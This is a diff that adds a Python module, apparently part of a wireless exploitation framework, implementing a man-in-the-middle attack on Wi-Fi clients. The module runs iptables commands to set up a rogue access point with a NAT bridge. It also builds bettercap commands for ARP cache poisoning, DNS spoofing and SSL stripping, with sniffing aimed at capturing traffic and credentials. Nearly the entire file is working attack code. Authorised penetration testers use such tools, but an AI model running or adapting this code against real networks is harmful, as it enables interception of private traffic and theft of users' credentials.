@@ -1,0 +1,137 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""Man-in-the-Middle Wi-Fi bridge module.
+
+Sets up a transparent MITM position using a rogue AP + NAT bridge or
+ARP spoofing on existing network. Supports SSL stripping, DNS spoofing,
+and credential sniffing.
+
+Attack modes:
+  - ap_bridge       Rogue AP with NAT to upstream (transparent proxy)
+  - arp_spoof       ARP cache poisoning on existing network
+  - dns_spoof       DNS spoofing via dnsmasq/dnschef
+  - ssl_strip       HTTP downgrade via sslstrip2 or bettercap
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import logging
+import shutil
+import subprocess
+from pathlib import Path
+from typing import List, Optional
+
+from wirelessxpl.core.exploit import *
+
+logger = logging.getLogger(__name__)
+
+
+class Exploit(Exploit):
+    """MITM Wi-Fi bridge with multiple interception backends."""
+
+    __info__ = {
+        "name": "MITM Wi-Fi Bridge",
+        "description": (
+            "Man-in-the-Middle via rogue AP bridge (NAT), ARP spoofing, DNS spoofing, "
+            "or SSL stripping. Captures traffic and credentials from Wi-Fi clients. "
+            "Requires two interfaces or upstream connection + bettercap/ettercap."
+        ),
+        "authors": ["André Henrique (@mrhenrike) | União Geek"],
+        "references": [
+            "https://www.bettercap.org/",
+            "https://github.com/sensepost/mana",
+            "https://www.ettercap-project.org/",
+        ],
+        "devices": ("wifi",),
+    }
+
+    mode = OptString("ap_bridge", "MITM mode: ap_bridge | arp_spoof | dns_spoof | ssl_strip")
+    ap_interface = OptString("wlan0", "Interface for rogue AP")
+    upstream_interface = OptString("eth0", "Interface for upstream internet (NAT)")
+    target_ip = OptString("", "Target IP for ARP spoof (blank = gateway)")
+    gateway_ip = OptString("", "Gateway IP for ARP spoof")
+    ssid = OptString("FreeWiFi", "SSID for rogue AP bridge mode")
+    dns_target = OptString("*", "DNS domain to spoof (* = all)")
+    dns_redirect_ip = OptString("10.0.0.1", "IP to redirect DNS queries to")
+    backend = OptString("bettercap", "Backend: bettercap | ettercap | manual")
+    capture_pcap = OptBool(True, "Capture traffic to PCAP file")
+    dry_run = OptBool(False, "Print commands without executing")
+
+    def _setup_nat(self) -> List[List[str]]:
+        """Generate iptables NAT commands for AP bridge mode."""
+        return [
+            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
+            ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
+             "-o", self.upstream_interface, "-j", "MASQUERADE"],
+            ["sudo", "iptables", "-A", "FORWARD", "-i", self.ap_interface,
+             "-o", self.upstream_interface, "-j", "ACCEPT"],
+            ["sudo", "iptables", "-A", "FORWARD", "-i", self.upstream_interface,
+             "-o", self.ap_interface, "-m", "state",
+             "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
+        ]
+
+    def _build_bettercap_cmd(self) -> List[str]:
+        """Build bettercap command for the selected mode."""
+        cmd = ["sudo", "bettercap"]
+
+        if self.mode == "arp_spoof":
+            cmd.extend(["-iface", self.upstream_interface])
+            caplet = "arp.spoof on; net.sniff on"
+            if self.target_ip:
+                caplet = "set arp.spoof.targets {}; {}".format(self.target_ip, caplet)
+            cmd.extend(["-eval", caplet])
+
+        elif self.mode == "dns_spoof":
+            cmd.extend(["-iface", self.ap_interface])
+            cmd.extend(["-eval", "set dns.spoof.domains {}; set dns.spoof.address {}; dns.spoof on; net.sniff on".format(
+                self.dns_target, self.dns_redirect_ip)])
+
+        elif self.mode == "ssl_strip":
+            cmd.extend(["-iface", self.ap_interface])
+            cmd.extend(["-eval", "set http.proxy.sslstrip true; http.proxy on; net.sniff on"])
+
+        return cmd
+
+    def run(self) -> None:
+        """Execute MITM attack."""
+        valid_modes = ("ap_bridge", "arp_spoof", "dns_spoof", "ssl_strip")
+        if self.mode not in valid_modes:
+            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
+            return
+
+        if self.backend == "bettercap" and not shutil.which("bettercap"):
+            print_error("bettercap not found on PATH. Install it first.")
+            return
+
+        log_dir = Path(".log")
+        log_dir.mkdir(parents=True, exist_ok=True)
+
+        if self.dry_run:
+            print_info("DRY RUN — MITM {} mode via {}".format(self.mode, self.backend))
+            if self.mode == "ap_bridge":
+                for cmd in self._setup_nat():
+                    print_status(" ".join(cmd))
+            cmd = self._build_bettercap_cmd()
+            print_status(" ".join(cmd))
+            return
+
+        if self.mode == "ap_bridge":
+            print_status("Setting up NAT bridge: {} -> {}".format(
+                self.ap_interface, self.upstream_interface))
+            for cmd in self._setup_nat():
+                subprocess.run(cmd, check=False)
+
+        cmd = self._build_bettercap_cmd()
+        print_status("Launching {} MITM ({} mode)...".format(self.backend, self.mode))
+        print_info("Command: {}".format(" ".join(cmd)))
+
+        try:
+            subprocess.run(cmd, check=False)
+        except KeyboardInterrupt:
+            print_info("\nMITM interrupted by user.")
+        except Exception as err:
+            print_error("MITM failed: {}".format(err))
+
+        print_info("MITM session complete.")
